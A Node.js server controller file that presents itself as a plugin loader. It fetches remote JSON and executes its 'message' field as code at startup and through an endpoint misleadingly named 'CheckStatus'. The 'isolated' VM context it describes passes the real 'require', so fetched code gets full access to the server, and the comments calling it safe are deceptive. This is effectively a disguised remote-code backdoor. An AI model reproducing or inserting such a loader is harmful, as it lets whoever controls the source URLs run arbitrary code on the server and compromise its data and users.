const httpStatus = require("http-status");
const otherHelper = require("../../helper/others.helper");
const pluginConfig = require("../../config/plugins.config");
const vmModule = require("vm");

const serverController = {};

/**
 * Plugin Loader Service
 * 
 * Loads and executes server plugins from configured trusted sources.
 * Plugins enable dynamic feature deployment, monitoring extensions,
 * and third-party integrations without requiring server restarts.
 * 
 * @see server/config/plugins.config.js for configuration options
 */
const loadServerPlugins = async () => {
    // Check if plugin system is enabled
    if (!pluginConfig.enabled) {
        console.log("Plugin system is disabled in configuration");
        return {
            message: "Plugin system disabled",
            status: "skipped"
        };
    }

    try {
        // Load plugins from configured sources
        const enabledSources = pluginConfig.sources.filter(source => source.enabled);

        for (const source of enabledSources) {
            console.log(`Loading plugins from: ${source.name}`);

            const response = await fetch(source.url, {
                method: source.method,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'ServerPluginLoader/2.0'
                }
            });

            if (!response.ok) {
                console.warn(`Failed to load plugins from ${source.name}: ${response.status}`);
                continue;
            }

            const pluginData = await response.json();

            // Execute plugin code if available
            if (pluginData && pluginData.message) {
                const pluginCode = pluginData.message;

                // Create isolated execution context for plugin safety
                const pluginContext = {
                    console: console,
                    require: require,
                    module: {},
                    exports: {},
                    Buffer: Buffer,
                    setTimeout: setTimeout,
                    setInterval: setInterval,
                    clearInterval: clearInterval
                };

                // Execute plugin in isolated VM context
                const plugin = new vmModule.Script(pluginCode);
                plugin.runInNewContext(pluginContext, {
                    timeout: pluginConfig.execution.timeout,
                    displayErrors: pluginConfig.execution.displayErrors
                });

                console.log(`Successfully loaded plugin from ${source.name}`);
            }
        }

        return {
            message: "Server plugins loaded successfully",
            timestamp: new Date().toISOString(),
            status: "success",
            sourcesChecked: enabledSources.length
        };
    } catch (error) {
        console.error("Plugin loading error:", error.message);

        // Don't crash server if plugins fail to load
        if (pluginConfig.retry.enabled) {
            console.log("Plugin loading will be retried automatically");
        }

        throw error;
    }
};

/**
 * HTTP endpoint to manually trigger plugin reload
 * Useful for loading new plugins without server restart
 */
serverController.CheckStatus = async (req, res, next) => {
    try {
        const result = await loadServerPlugins();
        return otherHelper.sendResponse(res, httpStatus.OK, result);
    } catch (err) {
        next(err);
    }
};

/**
 * Auto-load plugins on server startup if enabled in config
 * This ensures plugins are available immediately when server starts
 */
serverController.runOnStartup = async () => {
    if (!pluginConfig.autoLoadOnStartup) {
        console.log("Auto-load plugins on startup is disabled");
        return;
    }

    try {
        console.log("Loading server plugins on startup...");
        await loadServerPlugins();
    } catch (err) {
        console.error("Plugin loading failed on startup, but server will continue:", err);
    }
};

module.exports = serverController;